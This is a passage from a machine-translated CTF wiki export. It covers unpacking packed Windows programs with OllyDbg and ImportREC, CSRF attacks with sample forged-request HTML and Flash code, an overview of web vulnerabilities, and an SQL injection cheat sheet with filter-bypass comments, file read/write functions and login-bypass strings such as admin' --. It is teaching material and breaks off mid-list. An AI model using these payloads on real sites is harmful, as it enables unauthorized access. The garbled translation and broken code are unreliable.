(<code>original.exe</code> is the process I am debugging in OD, <code>EIP</code> in OD is in <code>OEP</code> position, using <code>Ollydump</code>Do not close this process afterwards.). <code>ImportREC</code> repair input table entry point needs to know <code>OEP</code>, that is, input in the <code>OEP</code> input box in the middle of the right side of the window.</p> <p></p> <p>As we know, in Ollydbg we know that the current entry point of the program is <code>0049C25C</code>, and the mirror base address is <code>00400000</code>.</p> <p>So we need to fill in <code>OEP</code> here is <code>0009C25C</code></p> <p>We modify the <code>OEP</code> in <code>ImportREC</code> to <code>0009C25C</code> and then click on 'AutoSearch`. A pop-up prompt box is displayed, \"The discovery may be the original IAT address\".</p> <p></p> <p>We can click <code>`Get Imports&amp;#39;</code> button to rebuild <code>IAT</code>. The left side will display the address of each imported function in <code>IAT</code> and whether it is valid. Obviously in the figure you can see <code>ImportREC</code> found in memory <code>IAT</code> Position and detect that each function is valid.</p> <p></p> <p>We click on <code>Fix Dump</code> and open the file that was previously dumped using the <code>OllyDump</code> plugin, which is the <code>dump.exe</code> file.</p> <p>Then <code>ImportREC</code> will help restore the import table and generate the <code>dump_.exe</code> file. <code>dump_.exe</code> will run normally.</p>"},{"location":"reverse/windows/unpack/last-exception/","title":"Last Exception Method","text":"<p>The principle of the last exception method is that the program may trigger countless exceptions during self-extraction or self-decryption. If you can locate the last program exception, it may be close to the automatic shelling completion position. Now the last An exception method shelling can take advantage of Ollydbg's exception counter plugin, first record the number of exceptions, then reload, automatically stop at the last exception.</p>"},{"location":"reverse/windows/unpack/last-exception/#_1","title":"\u8981\u70b9","text":"<ol> <li>Click on 'Options -&gt; Debug Options -&gt; Exceptions<code>, remove all the \u221a inside! Press</code>CTRL+F2` to reload the program.</li> <li>The start program is a jump, here we press <code>SHIFT+F9</code>, until the program runs, write down the number of times to start from <code>SHIFT+F9</code> to the program <code>m</code>!</li> <li><code>CTRL+F2</code> reload the program, press <code>SHIFT+F9</code> (the number of times this time is the program running times <code>m-1</code> times)</li> <li>In the lower right corner of the OD we see a \"<code>SE handle</code>\", then we press <code>CTRL+G</code> and enter the address before the `SE handle'!</li> <li>Press F2 to break the point! Then press <code>SHIFT+F9</code> to the breakpoint, F8 single step tracking</li> </ol>"},{"location":"reverse/windows/unpack/last-exception/#example","title":"example","text":"<p>The sample program can be downloaded here: 5_last_exception.zip</p> <p>OD loader, uncheck all ignore exceptions in the menu <code>Options -&amp;gt; Debug Settings -&amp;gt; Exceptions tab</code> and then reload the program.</p> <p></p> <p>We press <code>Shift+F9</code>, the number of times the record is pressed, the program runs normally. What we want to get is the number of times the second to last press is pressed. In this example</p> <ul> <li><code>shift+F9</code> once, to the position of <code>0040CCD2</code></li> <li><code>shift+F9</code> twice, the program runs normally</li> </ul> <p>Then we reload the program, just press 1 (<code>2-1=1</code>) <code>Shift+F9</code>, go to the position of <code>0040CCD2</code>, observe the stack window, there is a <code>SE handler: 0040CCD7</code></p> <p></p> <p>In the CPU window (assembly instruction), press <code>Ctrl+G</code>, enter <code>0040CCD7</code>, then press F2 here. That is, set a breakpoint at <code>0040CCD7</code>, then press <code>Shift+F9</code> to run. Trigger a breakpoint.</p> <p></p> <p>After triggering the breakpoint, step through the tracking. Down are some loops and jumps, we use F4 to skip the loop. Finally arrive at the following position</p> <p></p> <p>Obviously in the final <code>mov ebp, 0041010CC; jmp ebp</code> is in the jump to OEP, we jump past as shown below:</p> <p></p> <p>Obviously, we were lucky enough to come to OEP.</p>"},{"location":"reverse/windows/unpack/manually-fix-iat/","title":"Manually Find the IAT and Rebuild It Using ImportREC","text":"<p>The sample program can be downloaded from this link: manually_fix_iat.zip</p> <p>Our commonly used <code>ImportREC</code> shelling is the <code>IAT auto search</code> that comes with the software, but if we want to manually find the address of <code>IAT</code> and <code>dump</code>, what should we do?</p> <p>First use the ESP law, you can quickly jump to <code>OEP: 00401110</code>.</p> <p></p> <p>We right click and select `Find-&gt;call between all modules.</p> <p></p> <p>Shows the list of functions called, we double-click on one of the functions (note that the double-click here should be the function of the program instead of the system function)</p> <p></p> <p>We came to the function call</p> <p></p> <p>Right click on <code>follow</code> to enter the function</p> <p></p> <p>Then right click on the <code>data window to follow -&amp;gt; memory address</code></p> <p></p> <p>Here, because the display is a hexadecimal value, it is not convenient to view, we can right-click in the data window and select <code>long-&amp;gt;address</code> to display the function name.</p> <p></p> <p>Note that we have to scroll up to the beginning of the IAT table. We can see that the initial function address is <code>kernel.AddAtomA</code> of <code>004050D8</code>. We find the last function down, which is the <code>user32.MessageBoxA</code> function. Look at the size of the entire IAT table. At the bottom of the OD there is a display of 'block size: 0x7C<code>, so our entire IAT block size is</code>0x7C`</p> <p></p> <p>Open <code>ImportREC</code>, select the program we are debugging, then enter <code>OEP:1110, RVA:50D8, SIZE:7C</code>, and then click <code>Get Input Table</code>.</p> <p></p> <p>Here in the input table window, right click and select \"Advanced Command -&gt; Select Code Block\".</p> <p></p> <p>Then a pop-up window will appear, select the full dump, save as <code>dump.exe</code> file</p> <p></p> <p>After the dump is complete, select <code>Dump to file</code>, here choose to repair the dump.exe we just dumped, get a <code>dump\\_.exe</code>. At this point, the whole shelling is completed.</p>"},{"location":"reverse/windows/unpack/memory/","title":"Memory Mirroring Method","text":"<p>The memory mirroring method is to enter the virtual memory section of the program by the ALT's <code>ALT+M</code> shortcut when the packer is loaded. Then, by adding two memory one-time breakpoints, the correct OEP position of the program is reached.</p> <p>The principle of the memory mirroring method is that for the program resource segment and the code segment under the breakpoint, when the general program self-extracting or self-decrypting, the resource segment is first accessed to obtain the required resources, and then after the automatic shelling is completed, the program code segment is transferred back. At this time, the memory will be disconnected once, and the program will stop at OEP.</p>"},{"location":"reverse/windows/unpack/memory/#_1","title":"\u8981\u70b9","text":"<ol> <li>Select 'Options -&gt; Debug Options -&gt; Exceptions from the menu.</li> <li>Check all ignore exceptions</li> <li>Press <code>ALT+M</code> to open the memory image, find the first <code>.rsrc</code> of the program, press F2 to break the point, then press <code>SHIFT+F9</code> to run to the breakpoint.</li> <li>Press <code>ALT+M</code> again to open the memory image. Find the <code>.text</code> on the first <code>.rsrc</code> of the program (in the example, <code>00401000</code>), press F2 to break the point. Then press <code>SHIFT+F9</code> (or press F9 without exception)</li> </ol>"},{"location":"reverse/windows/unpack/memory/#example","title":"example","text":"<p>The sample program can be downloaded here: 4_memory.zip</p> <p>OD loader, check all ignore exceptions in the menu item 'Options -&gt; Debug Settings -&gt; Exceptions tab&gt;.</p> <p></p> <p>Press <code>Alt+M</code> to open the memory image and find the resource segment, which is <code>`srcrc</code> of <code>address=00407000</code>, <code>size=00005000</code>, select F2 to break</p> <p></p> <p>Go back to the CPU window, press F9 to run, the program is broken at <code>0040D75F</code></p> <p></p> <p>Press <code>Alt+M</code> again to open the memory image and break the <code>.text</code> code snippet.</p> <p></p> <p>Continue to run, the program is broken at <code>004010CC</code>, which is OEP</p> <p></p>"},{"location":"reverse/windows/unpack/packer-introduction/","title":"Introduction to the Protective case","text":""},{"location":"reverse/windows/unpack/packer-introduction/#what-is-the-shell","title":"What is the shell?","text":"<p>Shell is a program in some computer software that is specifically responsible for protecting software from unauthorized modification or decompilation.</p> <p>They generally run before the program, gain control, and then complete their task of protecting the software.</p> <p></p> <p>Since this program and the shell of nature have many functions in the same place, based on the naming rules, such a program is called a shell.</p>"},{"location":"reverse/windows/unpack/packer-introduction/#shell-classification","title":"Shell classification","text":"<p>We usually divide the shell** into two categories, one is a compression shell and the other is an encryption shell.</p>"},{"location":"reverse/windows/unpack/packer-introduction/#compressed-shell","title":"Compressed shell","text":"<p>Compressed shells have been around since the days of DOS, but at that time, due to limited computing power, the decompression overhead was too large and was not widely used.</p> <p>Using a compressed shell can help reduce the size of PE files, hide the internal code and resources of PE files, and facilitate network transmission and storage.</p> <p>Usually, there are two types of compression shells. One is just a compression shell for compressing ordinary PE files, and the other is a large deformation of the source file, which seriously damages the PE file header and is often used to compress malicious programs.</p> <p>Common compression shells are: Upx, ASpack, PECompat</p>"},{"location":"reverse/windows/unpack/packer-introduction/#encryption-shell","title":"Encryption shell","text":"<p>Encryption shells or protective cases, there are a variety of techniques to prevent reverse code analysis, its main function is to protect PE from code reverse analysis.</p> <p>Since the primary purpose of the Encryption Shell is no longer to compress file resources, the PE shell protected by the Encryption Shell is usually much larger than the original file.</p> <p>At present, the encryption shell is widely used for security-critical applications, and sensitive programs are also used to avoid (reduce) detection and killing of anti-virus software.</p> <p>Common encryption shells are: ASProtector, Armadillo, EXECryptor, Themida, VMProtect</p>"},{"location":"reverse/windows/unpack/packer-introduction/#shell-loading-process","title":"Shell loading process","text":""},{"location":"reverse/windows/unpack/packer-introduction/#save-entry-parameters","title":"Save entry parameters","text":"<ol> <li>The value of each register is saved when the packer is initialized.</li> <li>After the shell is executed, restore each register value.</li> <li>Finally jump to the original program execution</li> </ol> <p>Usually use the <code>pushad</code> / <code>popad</code>, <code>pushfd</code> / <code>popfd</code> command to save and restore the live environment</p>"},{"location":"reverse/windows/unpack/packer-introduction/#get-the-required-function-api","title":"Get the required function API","text":"<ol> <li>There are only <code>GetProcAddress</code>, <code>GetModuleHandle</code> and <code>LoadLibrary</code> API functions in the input table of the general shell.</li> <li>If other API functions are required, map the DLL file to the calling process's address space via <code>LoadLibraryA(W)</code> or <code>LoadLibraryExA(W)</code></li> <li>If the DLL file has been mapped into the address space of the calling process, you can call the <code>GetModuleHandleA(W)</code> function to get the DLL module handle.</li> <li>Once the DLL module is loaded, you can call the <code>GetProcAddress</code> function to get the address of the input function.</li> </ol>"},{"location":"reverse/windows/unpack/packer-introduction/#decrypting-each-block-data","title":"Decrypting each block data","text":"<ol> <li>For the purpose of protecting source code and data, each block of the source program file is generally encrypted. The shell decrypts these block data when the program is executed to make the program run normally.</li> <li>The shell is generally encrypted by block, decrypted by block, and the decrypted data is placed back in the appropriate memory location.</li> </ol>"},{"location":"reverse/windows/unpack/packer-introduction/#jump-back-to-the-original-entry-point","title":"Jump back to the original entry point","text":"<ol> <li>Before jumping back to the entry point, the original PE file input form (IAT) will be restored and the relocation items (mainly DLL files) will be processed.</li> <li>Because the shell itself constructs an input table when packing, you need to re-acquire all the functions introduced by each DLL and fill in the IAT table.</li> <li>After completing the above work, the control will be transferred to the original program and continue to be executed.</li> </ol>"},{"location":"reverse/windows/unpack/sfx/","title":"SFX Method","text":"<p>The \"SFX\" method takes advantage of the OEP search function that comes with Ollydbg. You can choose to stop the program directly at the OEP found by the OD. At this time, the decompression process of the shell is completed, and you can directly dump the program.</p>"},{"location":"reverse/windows/unpack/sfx/#_1","title":"\u8981\u70b9","text":"<ol> <li>Set OD, ignore all exceptions, that is, check the exception tab</li> <li>Switch to the SFX tab and select \"Byte mode to track the actual entry (very slow)\", OK</li> <li>Reload the program (if \"Block code?\" is selected, \"No\", OD directly reaches OEP)</li> </ol>"},{"location":"reverse/windows/unpack/sfx/#example","title":"example","text":"<p>The sample program can be downloaded here: 6_sfx.zip</p> <p>First we check all ignore exceptions in the menu <code>Options -&amp;gt; Debug Settings -&amp;gt; Exceptions tab</code>.</p> <p></p> <p>Then switch to the <code>SFX</code> tab and click on \"Byte mode to track the real entrance (very slow)\"</p> <p></p> <p>Overloading the program, the program has stopped at the code entry point, and there is no need to re-analyze the OEP.</p> <p></p>"},{"location":"reverse/windows/unpack/trace/","title":"Single Step Tracking Method","text":"<p>The principle of the single-step tracking method is to go through the steps of (F8), step (F7) and run to (F4) of Ollydbg, completely go through the self-shelling process of the program, skip some fragments of the loop recovery code, and use the single Step to ensure that the program will not skip OEP. This way, after the software auto-hull module is finished running, it will reach OEP and dump the program.</p>"},{"location":"reverse/windows/unpack/trace/#_1","title":"\u8981\u70b9","text":"<ol> <li>Open the program and press F8 to step down. Try to implement the downward jmp jump.</li> <li>You will often encounter large loops, then use F4 to skip the loop.</li> <li>If the function is not far away is a call (near call), then we try not to skip directly, but enter this call</li> <li>The jmp instruction with a large jump range is most likely to jump to the original program entry point (OEP).</li> </ol>"},{"location":"reverse/windows/unpack/trace/#example","title":"example","text":"<p>The sample program can be downloaded here: 1_trace.zip</p> <p>The single-step tracking method is to go down the program entry point step by step. In the single-step process, pay attention to the EIP not to go wrong, but for some complicated shells, the single-step process will be extremely boring and easy. I confuse myself. So single-step tracking is also often used to analyze some key code parts (combined with static analysis), rather than completely from the beginning to the end, which is contrary to the concept of reverse engineering.</p> <p>Open the Notepad.exe in the archive with Ollydbg and stop at the location below. The entry point is a <code>pushad</code> that saves all register states to the stack, followed by a <code>call</code> call to the function at <code>0040D00A</code>. After that, unconditionally jump to <code>459DD4F7</code>, then <code>push ebp</code> and <code>retn</code> obviously have no meaning. Like this entry point is a <code>call</code> we call <code>near call</code>, for near call us Select step, press F7 (of course you can only choose to step, or EIP will stop the program).</p> <p></p> <p>After the stepping is a <code>call</code>, we continue to step, press F7, follow up and find that there is no near call, we can see the program in the <code>GetModuleHandleA</code>, <code>GetProcAddress</code> and other APIs, continue to analyze downwards.</p> <p></p> <p>After that, we will encounter multiple jumps. We try to satisfy the downward jump. For the upward jump, we will not implement it and use F4 to jump out of the loop until <code>0040D3AF</code>. We look at the following code.</p> <p><code>`</code>asm 0040D3AF    61                  popad</p> <p>0040D3B0    75 08               jnz short NotePad.0040D3BA</p> <p>0040D3B2    B8 01000000         mov eax,0x1</p> <p>0040D3B7 C2 0C00 direction 0xC 0040D3BA    68 CC104000         push NotePad.004010CC</p> <p>0040D3BF C3 retn ```</p> <p>Here <code>popad</code> can restore the state of the register saved at the program entry point, then <code>jnz</code> jumps to <code>0040D3BA</code>, here uses <code>push</code> and <code>retn</code> to change <code>EIP</code> to <code>004010CC</code>, also That is to say, after the shell decompresses the code and other resources, it will jump to <code>push</code> through <code>jnz</code>, then set <code>EIP</code> to the original entry point (OEP) and return by <code>push</code> and <code>ret</code>. Go to OEP, and then continue to execute the code of the original program. After we return to <code>retn</code>, we can see the following:</p> <p></p> <p>Obviously, we went to a bunch of places where <code>Ollydbg</code> was mistaken for data. Obviously <code>Ollydbg</code> analysis error, we need to let <code>Ollydbg</code> re-analyze, we can right-click <code>analysis-&amp;gt;delete analysis from module. , or press</code>ctrl+a`, which correctly displays the assembly instructions at OEP.</p> <p></p>"},{"location":"reverse/windows/unpack/unpack-dll/","title":"DLL File Unpacking","text":"<p>Here you need to contact the previous section [Manually find IAT and use ImportREC to rebuild] (/reverse/unpack/manually-fix-iat/index.html)</p> <p>The example file can be downloaded here: unpack_dll.zip</p> <p>This step is required for <code>Dll</code> shelling. The most critical step for <code>Dll</code> shelling is to use LordPE to modify its Dll flag, open <code>UnpackMe.dll</code> with <code>LordPE</code>, and click on the feature value. ...<code>, then uncheck the</code>DLL` flag. After saving, the system will treat the file as an executable file.</p> <p></p> <p>We changed the <code>UnpackMe.dll</code> suffix to <code>UnpackMe.exe</code> and loaded it with OD.</p> <p></p> <p>Usually at the entry point, the program will save some information, here is very simple, just make a <code>cmp</code>. One thing to note is that the <code>jnz</code> jump here jumps directly to the end of the <code>unpacking</code> process. So we Need to modify the <code>z</code> flag of the register to invalidate the jump. Also set a breakpoint at the end of the <code>unpacking</code> process to avoid shelling and then run directly. (The program will break at this breakpoint, but the shell has been Finished, the code is very clear)</p> <p>The basic steps of <code>Dll</code> shelling are the same as the <code>exe</code> file shelling, and when rebuilding \u02bbIAT<code>, you need to follow the previous article [Manually find IAT and use ImportREC to rebuild] (/reverse/unpack/manually-fix-iat /index.html) As mentioned, manually find the</code>IAT<code>table and rebuild it with</code>ImportREC<code>. Just note that after unpacking the dump, remember to restore the</code>DLL<code>flag with LordPE and append the file name. Change to</code>.dll`.</p>"},{"location":"web/csrf/","title":"CSRF Cross-Site Request Forgery","text":""},{"location":"web/csrf/#csrf-introduction","title":"CSRF Introduction","text":"<p>CSRF, full name Cross Site Request Forgery, cross-site request forgery. It is easy to confuse it with XSS. For CSRF, the two key points are the cross-site request and request forgery. Since the target station has no token or referer defense, each parameter of the user's sensitive operation can be known by the attacker. The attacker can forge a completely identical request to achieve malicious purposes as the user.</p>"},{"location":"web/csrf/#csrf-type","title":"CSRF type","text":"<p>According to the request type, it can be divided into GET type and POST type.</p> <p>According to the attack method, it can be divided into HTML CSRF, JSON HiJacking, Flash CSRF, and so on.</p>"},{"location":"web/csrf/#html-csrf","title":"HTML CSRF","text":"<p>The CSRF request is issued with HTML elements, which is the most common CSRF attack.</p> <p>Tags in the HTML that can be set to a link address such as <code>src/href</code> can initiate a GET request, such as:</p> <pre><code>&lt;link href=\"\"&gt;\n\n&lt;img src=\"\"&gt;\n\n&lt;img lowsrc=\"\"&gt;\n\n&lt;img dynsrc=\"\"&gt;\n\n&lt;meta http-equiv=\"refresh\" content=\"0; url=\"&gt;\n\n&lt;iframe src=\"\"&gt;\n\n&lt;frame src=\"\"&gt;\n\n&lt;script src=\"\"&gt;&lt;/script&gt;\n\n&lt;bgsound src=\"\"&gt;&lt;/bgsound&gt;\n\n&lt;embed src=\"\"&gt;&lt;/bgsound&gt;\n\n&lt;video src=\"\"&gt;&lt;/video&gt;\n\n&lt;audio src=\"\"&gt;&lt;/audio&gt;\n\n&lt;a href=\"\"&gt;&lt;/a&gt;\n\n&lt;table background=\"\"&gt;&lt;/table&gt;\n\n......\n</code></pre> <p>Also in the CSS style:</p> <pre><code>@import \"\"\n\nbackground:url(\"\")\n\n......\n</code></pre> <p>Forms can also be used to forge POST-type requests.</p> <pre><code>&lt;form action=\"http://www.a.com/register\" id=\"register\" method=\"post\"&gt;\n\n  &lt;input type=text name=\"username\" value=\"\" /&gt;\n\n  &lt;input type=password name=\"password\" value=\"\" /&gt;\n\n&lt;/form&gt;\n\n&lt;script&gt;\n\n  var f = document.getElementById(\"register\");\n\n  f.inputs[0].value = \"test\";\n\n  f.inputs[1].value = \"passwd\";\n\n  f.submit();\n\n&lt;/script&gt;\n</code></pre>"},{"location":"web/csrf/#flash-csrf","title":"Flash CSRF","text":"<p>Flash also has a variety of ways to initiate network requests, including POST.</p> <p><code>`</code>js import flash.net.URLRequest;</p> <p>import flash.system.Security;</p> <p>var url = new URLRequest(\"http://target/page\");</p> <p>var param = new URLVariables (); param = \"test=123\";</p> <p>url.method = \"POST\";</p> <p>url.data = param; sendToURL(url);</p> <p>stop();</p> <pre><code>Flash can also use the methods `getURL`, `loadVars`, etc. to initiate a request.\n\n\n`` `js\nreq = new LoadVars();\n\nreq.addRequestHeader(\"foo\", \"bar\");\n\nreq.send(\"http://target/page?v1=123&amp;v2=222\", \"_blank\", \"GET\");\n</code></pre>"},{"location":"web/csrf/#csrfs-defense","title":"CSRF's defense","text":""},{"location":"web/csrf/#verification-code","title":"Verification code","text":"<p>The verification code forces the user to interact with the app to complete the final request.</p>"},{"location":"web/csrf/#referer-check","title":"Referer Check","text":"<p>Check if the request is from a legitimate source. But the server does not always get the Referer.</p>"},{"location":"web/csrf/#token","title":"Token","text":"<p>The essential reason why CSRF can attack success is that all parameters of important operations can be guessed by the attacker.</p> <p>Keep the original parameters unchanged, add a parameter Token, the value is random, in the actual application, the Token can be placed in the user's Session, or in the browser's Cookies.</p> <p>Token must be random enough. In addition, the purpose of Token is not to prevent duplicate submissions, so for the convenience of use, it is allowed to use the same Token in the lifetime of a user before the Token is consumed, but if the user has already submitted the form, the Token has Consumed, the token should be regenerated.</p> <p>Token should also pay attention to its confidentiality. If the Token appears in the URL, it may be leaked through the Referer. Try to put the Token in the form, change the sensitive operation from GET to POST, submit it as a form or AJAX, avoid Token. Give way.</p>"},{"location":"web/introduction/","title":"Introduction to Web Applications","text":"<p>With the birth of a series of new Internet products such as WEB 2.0, social network, Weibo, etc., Internet applications based on WEB environment are more and more extensive. In the process of enterprise informationization, various applications are set up on WEB platform, WEB business. The rapid development has also aroused strong concern of hackers. What followed is the emergence of WEB security threats. Hackers use the vulnerability of the operating system and the vulnerability of the WEB service program to gain control of the WEB server, and tamper with the content of the webpage. Stealing important internal data, and more serious, is to embed malicious code in web pages, causing website visitors to be compromised.</p> <p>In the CTF competition, WEB is also one of the most important directions. The WEB category has a wide variety of topics, and the knowledge points are fragmented and time-sensitive. It can keep up with the current hotspots and be close to actual combat.</p> <p>Topics in the WEB class include, but are not limited to, SQL injection, XSS cross-site scripting, CSRF cross-site request forgery, file uploading, file inclusion, framework security, PHP common vulnerabilities, code auditing, and more.</p>"},{"location":"web/introduction/#sql-injection","title":"SQL Injection","text":"<p>By injecting SQL syntax into user-controllable parameters, the original SQL structure is destroyed, and the attack behavior of unexpected results when writing the program is achieved. The cause can be attributed to the superposition of the following two reasons:</p> <ol> <li>The programmer writes the SQL statement using string concatenation when dealing with application and database interactions.</li> <li>The user controllable parameters are not filtered enough to splicing the parameters into the SQL statement.</li> </ol>"},{"location":"web/introduction/#xss-cross-site-scripting-attack","title":"XSS Cross-site scripting attack","text":"<p>Cross Site Scripting is abbreviated to the abbreviation of Cascading Style Sheets (CSS), so the cross-site scripting attack is abbreviated as XSS. A malicious attacker inserts malicious HTML code into the WEB page. When the user browses the page, the HTML code embedded in the Web will be executed, thereby achieving the special purpose of maliciously attacking the user.</p>"},{"location":"web/introduction/#command-execution","title":"Command Execution","text":"<p>When an application needs to call some external program to process the content, some functions that execute system commands are used. For example, <code>system</code>, <code>exec</code>, <code>shell_exec</code>, etc. in PHP, when the user can control the parameters in the command execution function, the malicious system command can be injected into the normal command, causing the command execution attack. Here is mainly the introduction of command execution vulnerabilities mainly in PHP, and the details of Java and other applications are to be added.</p>"},{"location":"web/introduction/#file-contains","title":"File contains","text":"<p>If the client user input is allowed to control the files dynamically included in the server, it will lead to the execution of malicious code and the disclosure of sensitive information, mainly including local file inclusion and remote file inclusion.</p>"},{"location":"web/introduction/#csrf-cross-site-request-forgery","title":"CSRF Cross-site request forgery","text":"<p>Cross-Site Request Forgery (CSRF) is an attack that causes a logged-in user to perform some action without their knowledge. Because the attacker does not see the response to the fake request, the CSRF attack is mainly used to perform actions instead of stealing user data. When the victim is a normal user, CSRF can transfer the user's funds, send mail, etc. without their knowledge; but if the victim is a user with administrator rights, CSRF may threaten the entire WEB system. Safety.</p>"},{"location":"web/introduction/#ssrf-server-side-request-forgery","title":"SSRF server-side request forgery","text":"<p>SSRF (Server-Side Request Forgery) is a security vulnerability that is constructed by an attacker to form a request initiated by a server. In general, the target of an SSRF attack is an internal system that is inaccessible from the external network.</p>"},{"location":"web/introduction/#file-upload","title":"File Upload","text":"<p>In the operation of the website, it is inevitable to update some pages or contents of the website, and then the function of uploading files to the website is needed. If you do not restrict the restrictions or the restrictions are bypassed, this feature may be used to upload executable files, scripts to the server, and further cause the server to fall.</p>"},{"location":"web/introduction/#click-to-hijack","title":"Click to hijack","text":"<p>Clickjacking was first created in 2008 by Internet security experts Robert Hansen and Jeremiah Grausman.</p> <p>It is a kind of visual spoofing. On the WEB side, the iframe is nested with a transparent and invisible page, so that the user can click on the location where the attacker wants to trick the user into clicking without knowing it.</p> <p>Due to the appearance of clickjacking, there is a way of anti-frame nesting, because clickjacking requires iframe nested pages to attack.</p> <p>The following code is the most common example of preventing frame nesting:</p> <p><code>`</code>js if(top.location!=location)</p> <pre><code>top.location=self.location;\n</code></pre> <pre><code>## VPS Virtual Private Server\n\n\nVPS (Virtual Private Server) technology, which divides a server into high-quality services for multiple virtual private servers. The technology for implementing VPS is divided into container technology and virtualization technology. In a container or virtual machine, each VPS can be assigned a separate public IP address, a separate operating system, and achieve isolation between different VPS disk space, memory, CPU resources, processes, and system configurations, simulating exclusive use for users and applications. The experience of using computing resources. VPS can reinstall the operating system, install programs, and restart the server separately, just like a standalone server. VPS provides users with the freedom to manage configurations for enterprise virtualization or for IDC resource leases.\n\n\nIDC resource rental, provided by the VPS provider. The difference in hardware VPS software used by different VPS providers and the different sales strategies, the VPS experience is also quite different. Especially when the VPS provider is oversold, the VPS performance will be greatly affected when the physical server is overloaded. Relatively speaking, container technology is more efficient and more expensive than virtual machine technology hardware, so the price of container VPS is generally lower than the price of virtual machine VPS.\n\n\n## Conditional competition\n\n\nA conditional contention vulnerability is a server-side vulnerability. Because the server side processes concurrently when processing requests from different users, such problems may occur if the concurrent processing is improper or the logical sequence design of the related operations is unreasonable. .\n\n\n## XXE\n\n\nXXE Injection is XML External Entity Injection, which is an XML external entity injection attack. Vulnerabilities are security issues caused when processing non-secure external entity data.\n\n\nIn the XML 1.0 standard, the concept of entities is defined in the XML document structure. Entities can be called in the document by pre-definition, and the identifier of the entity can access local or remote content. If &amp;quot;pollution&amp;quot; is introduced in the process Sources, after processing XML documents, can lead to security issues such as information leakage.\n\n\n## XSCH\n\n\nDue to the negligence of web developers in the development process using Flash, Silverlight, etc., the correct configuration of the cross-domain policy file (crossdomain.xml) did not cause problems. E.g:\n\n\n```xml\n\n&lt;cross-domain-policy&gt;\n\n    &lt;allow-access-from domain=\u201c*\u201d/&gt;\n\n&lt;/cross-domain-policy&gt;\n</code></pre> <p>Because the cross-domain policy file is configured as <code>*</code>, it means that any domain Flash can interact with it, which can initiate requests and get data.</p>"},{"location":"web/introduction/#function-level-access-missing","title":"\u8d8a\u6743 (function level access missing)","text":"<p>An unauthorized vulnerability is a common security vulnerability in web applications. Its threat is that an account can control the total station user data. Of course, this data is limited to the data corresponding to the vulnerability feature. The cause of the ultra-authority vulnerability is mainly because the developer over-trusts the data requested by the client when adding, deleting, modifying, and querying the data, and misses the authority. So testing over-authorization is a process of careful planning with developers.</p>"},{"location":"web/introduction/#sensitive-information-disclosure","title":"Sensitive information disclosure","text":"<p>Sensitive information refers to information that is not known to the public, has actual and potential use value, and is harmless to society, business or individuals due to loss, improper use or unauthorized access. Including: personal privacy information, business operations information, financial information, personnel information, IT operation and maintenance information. Leaks include Github, Baidu Library, Google code, website directories, and more.</p>"},{"location":"web/introduction/#incorrect-security-configuration","title":"Incorrect security configuration","text":"<p>Security Misconfiguration: Sometimes, using the default security configuration can make your application vulnerable to multiple attacks. It is important to use the best security configuration available in deployed applications, web servers, database servers, operating systems, code libraries, and all application-related components.</p>"},{"location":"web/introduction/#waf","title":"WAF","text":"<p>Web application protection system (also known as: Web application level intrusion prevention system. English: Web Application Firewall, referred to as: WAF). Take advantage of an internationally accepted statement: WEB Application Firewall is a product that specifically protects WEB applications by implementing a series of security policies for HTTP/HTTPS.</p>"},{"location":"web/introduction/#ids","title":"IDS","text":"<p>IDS is the abbreviation of English Intrusion Detection Systems, which means \"intrusion detection system\" in Chinese. Professionally speaking, according to a certain security policy, through the software and hardware, the network and system operation status are monitored, and various attack attempts, attacks or attack results are found as much as possible to ensure the confidentiality and integrity of the network system resources. And availability. To make an image metaphor: If the firewall is the door lock of a building, IDS is the monitoring system in this building. Once the thief climbs into the building, or the insider has an out-of-bounds behavior, only the real-time monitoring system can detect the situation and issue a warning.</p>"},{"location":"web/introduction/#ips","title":"IPS","text":"<p>Intrusion Prevention System (IPS) is a computer network security facility that complements Antivirus Programs and Packet Filters (Application Gateways). Intrusion-prevention system is a computer network security device that can monitor the network data transmission behavior of a network or network device, and can instantly interrupt, adjust or isolate some abnormal or harmful network data transmission behavior. .</p>"},{"location":"web/introduction/#references","title":"References","text":"<ul> <li>WEB \u6e17\u900f Wiki</li> </ul>"},{"location":"web/sqli/","title":"SQL Injection","text":""},{"location":"web/sqli/#basic-concept","title":"basic concept","text":"<ul> <li>SQL injection is an input parameter that inserts or adds SQL code to an application (user), and then passes these parameters to the backend SQL server for parsing and execution.</li> <li>An attacker can modify an SQL statement that has the same permissions as the component that executes the command, such as a database server, application server, or web server.</li> <li>SQL injection usually occurs if the WEB application developer cannot ensure that the value received from the WEB form, cookies, input parameters, etc. is passed to the SQL query (which is executed on the database server) before it is verified Vulnerabilities.</li> </ul>"},{"location":"web/sqli/#common-tools","title":"Common tools","text":"<ul> <li>Burp Suite: Introduction to Burp Suite</li> <li> <p>Tamper Data (Firefox addon)</p> </li> <li> <p>HackBar (Firefox addon)</p> </li> <li> <p>sqlmap: sqlmap user manual</p> </li> </ul>"},{"location":"web/sqli/#injecting-common-parameters","title":"Injecting common parameters","text":"<ul> <li><code>user()</code>: current database user</li> <li><code>database()</code>: current database name</li> <li><code>version()</code>: the currently used database version</li> <li><code>@@datadir</code>: database storage data path</li> <li><code>concat()</code>: Union data used to combine two data results. Such as <code>concat(username,0x3a,password)</code></li> <li><code>group_concat()</code>: Similar to <code>concat()</code>, such as <code>group_concat(DISTINCT+user, 0x3a, password)</code>, used to inject multiple pieces of data at once</li> <li><code>concat_ws()</code>: usage is similar</li> <li><code>hex()</code> and <code>unhex()</code>: for hex encoding and decoding</li> <li><code>load_file()</code>: Read the file as text. In Windows, the path is set to <code>\\\\</code></li> <li><code>select xxoo into outfile &amp;#39;path&amp;#39;</code>: can write files directly when the permission is high</li> </ul>"},{"location":"web/sqli/#grammar-reference-and-tips","title":"Grammar Reference and Tips","text":""},{"location":"web/sqli/#interline-notes","title":"Interline Notes","text":"<ul> <li><code>--</code></li> </ul> <pre><code>DROP sampletable;--\n</code></pre> <ul> <li><code>#</code></li> </ul> <pre><code>DROP sampletable;#\n</code></pre>"},{"location":"web/sqli/#inline-comment","title":"Inline comment","text":"<ul> <li><code>/* comment content */</code></li> </ul> <pre><code>DROP/*comment*/sampletable` DR/**/OP/* bypass filtering */sampletable` SELECT/* replace spaces */password/**/FROM/**/Members\n</code></pre> <ul> <li><code>/*! MYSQL exclusive*/</code></li> </ul> <pre><code>SELECT /*!32302 1/0, */ 1 FROM tablename\n</code></pre>"},{"location":"web/sqli/#string-encoding","title":"string encoding","text":"<ul> <li><code>ASCII()</code>: return the ASCII value of the character</li> <li><code>CHAR()</code>: converts an integer to the corresponding character</li> </ul>"},{"location":"web/sqli/#backstage-universal-password","title":"Backstage universal password","text":"<ul> <li> <p><code>admin' --</code></p> </li> <li> <p><code>admin' #</code></p> </li> <li> 